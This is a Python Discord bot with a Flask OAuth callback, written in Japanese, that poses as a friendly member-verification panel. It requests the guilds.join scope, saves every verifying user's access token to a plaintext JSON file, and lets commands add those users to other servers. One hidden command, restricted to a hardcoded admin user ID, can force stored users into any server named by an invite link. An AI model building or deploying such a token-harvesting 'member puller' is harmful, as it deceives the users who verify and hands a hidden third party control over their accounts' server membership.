import discord
from discord.ext import commands
from discord import app_commands
import requests
from flask import Flask, request
import threading
import os
import json
import logging
from dotenv import load_dotenv

# ログ設定
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()

# --- 環境変数 ---
TOKEN = os.getenv('BOT_TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI')
ADMIN_USER_ID = 800419751880556586  # 指定のユーザーID

DB_FILE = 'users_v3.json'

# --- データベース機能 ---
def load_users():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_user(user_id, token, guild_id):
    users = load_users()
    u_id = str(user_id)
    if u_id not in users:
        users[u_id] = {"token": token, "guilds": []}
    if guild_id and str(guild_id) not in users[u_id]["guilds"]:
        users[u_id]["guilds"].append(str(guild_id))
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)

# --- 招待用モーダル ---
class MemberModal(discord.ui.Modal, title='招待マジック 🌸'):
    invite_url = discord.ui.TextInput(label='招待リンク', placeholder='https://discord.gg/xxxx', required=True)
    count = discord.ui.TextInput(label='追加する人数', placeholder='例: 50', required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        try:
            target_count = int(self.count.value)
            code = self.invite_url.value.split('/')[-1]
            res = requests.get(f"https://discord.com/api/v10/invites/{code}")
            if res.status_code != 200:
                return await interaction.followup.send("❌ 招待リンクが無効みたい...", ephemeral=True)
            
            target_guild_id = res.json().get('guild', {}).get('id')
            users = load_users()
            u_ids = list(users.keys())[:target_count]

            success = 0
            for uid in u_ids:
                url = f'https://discord.com/api/guilds/{target_guild_id}/members/{uid}'
                headers = {'Authorization': f'Bot {TOKEN}'}
                r = requests.put(url, headers=headers, json={'access_token': users[uid]['token']})
                if r.status_code in [201, 204]: success += 1
            
            await interaction.followup.send(f"🌸 完了！ {success}人をサーバーに追加したよ！", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"⚠️ エラー: {e}", ephemeral=True)

class AdminButtonView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)
    @discord.ui.button(label="追加メニューを開く", style=discord.ButtonStyle.secondary, emoji="✨")
    async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id == ADMIN_USER_ID:
            await interaction.response.send_modal(MemberModal())
        else:
            await interaction.response.send_message("権限がありません。", ephemeral=True)

# --- Bot クラス ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

# --- コマンド実装 ---

@bot.tree.command(name="setup", description="認証パネルを設置します")
@app_commands.checks.has_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    safe_uri = REDIRECT_URI.replace(':', '%3A').replace('/', '%2F')
    auth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={safe_uri}&scope=identify+guilds.join&state={interaction.guild_id}"
    
    embed = discord.Embed(title="🌸 メンバー認証パネル 🌸", description="下のボタンをぽちっと押してね！\n連携すると、サーバーの全機能が解放されるよ✨", color=0xffb6c1)
    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="Verify (認証して参加するっ！)", url=auth_url, style=discord.ButtonStyle.link))
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="call", description="認証済みユーザーをこのサーバーに招待します")
@app_commands.checks.has_permissions(administrator=True)
async def call(interaction: discord.Interaction):
    users = load_users()
    gid = str(interaction.guild_id)
    current_guild_users = [u for u, data in users.items() if gid in data.get("guilds", [])]
    
    if len(current_guild_users) < 10:
        return await interaction.response.send_message(f"❌ 10人以上認証されないと実行できないよ！（現在: {len(current_guild_users)}人）", ephemeral=True)

    await interaction.response.send_message(f"✨ {len(current_guild_users)}人を招待中...", ephemeral=True)
    success = 0
    for u_id in current_guild_users:
        url = f'https://discord.com/api/guilds/{gid}/members/{u_id}'
        headers = {'Authorization': f'Bot {TOKEN}'}
        res = requests.put(url, headers=headers, json={'access_token': users[u_id]['token']})
        if res.status_code in [201, 204]: success += 1
    await interaction.followup.send(f"🌸 完了！ {success}人を追加したよ！")

@bot.tree.command(name="confirmation", description="このサーバーの認証人数を確認します")
@app_commands.checks.has_permissions(administrator=True)
async def confirmation(interaction: discord.Interaction):
    users = load_users()
    count = sum(1 for data in users.values() if str(interaction.guild_id) in data.get("guilds", []))
    embed = discord.Embed(title="📊 サーバー内認証状況", description=f"現在の認証済み人数: **{count}** 人", color=0xa1c4fd)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="comtion", description="ボット全体の総認証人数を確認します")
@app_commands.checks.has_permissions(administrator=True)
async def comtion(interaction: discord.Interaction):
    users = load_users()
    embed = discord.Embed(title="🌍 ボット全体認証状況", description=f"総認証ユーザー数: **{len(users)}** 人", color=0xc2e9fb)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.command(name="Member")
async def member_cmd(ctx):
    if ctx.author.id == ADMIN_USER_ID:
        await ctx.message.delete()
        await ctx.send("🔐 管理者用ボタンを設置したよ（1分で消えます）", view=AdminButtonView(), delete_after=60)

# --- Flask Server ---
app = Flask(__name__)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    guild_id = request.args.get('state')
    
    data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
    res = requests.post('https://discord.com/api/oauth2/token', data=data).json()
    
    if 'access_token' not in res:
        return f"認証エラー: {res}", 500

    access_token = res['access_token']
    u_info = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'}).json()
    
    save_user(u_info['id'], access_token, guild_id)

    return """
    <!DOCTYPE html>
    <html lang="ja">
    <head>
        <meta charset="UTF-8">
        <style>
            body { margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: sans-serif; background: linear-gradient(135deg, #fceaf0 0%, #e8f0ff 100%); }
            .card { background: rgba(255, 255, 255, 0.4); backdrop-filter: blur(20px); padding: 50px; border-radius: 40px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.05); border: 1px solid rgba(255,255,255,0.7); }
            h1 { color: #ff85a2; }
            .btn { display: inline-block; padding: 15px 40px; color: #ff85a2; background: white; border-radius: 50px; text-decoration: none; font-weight: bold; margin-top: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
        </style>
    </head>
    <body>
        <div class="card">
            <h1>認証成功だよっ！🌸</h1>
            <p>もふもふパワーで連携完了✨<br>Discordに戻ってね♪</p>
            <div class="btn">完了</div>
        </div>
    </body>
    </html>
    """

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(TOKEN)